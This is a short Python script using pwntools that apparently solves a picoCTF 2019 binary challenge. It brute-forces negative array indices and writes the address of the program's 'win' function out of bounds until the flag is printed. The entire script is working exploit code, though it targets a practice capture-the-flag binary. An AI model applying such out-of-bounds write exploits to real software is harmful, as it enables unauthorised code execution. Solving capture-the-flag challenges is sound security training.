import os; os.environ['TMPDIR'] = os.path.join(os.environ['HOME'], 'tmp')
import pwn

remote_binary = "/problems/l1im1tl355_4_b2111fe5737c985221bac06a80d6d6c7/vuln"
dst = "2019shell1.picoctf.com"

def attack():
    elf = pwn.ELF(remote_binary)
    for i in range(-512, 0, 1):
      pr = pwn.process(remote_binary, cwd=os.path.dirname(remote_binary))
      try:
          pr.writelineafter("Input the integer value you want to put in the array\n", str(elf.sym["win"]))
          pr.writelineafter("Input the index in which you want to put the value\n", str(i))
          rsp = pr.readall(timeout=0.5)
          if "pico" in rsp:
                print(rsp)
                break
      finally:
          pr.close()

attack()
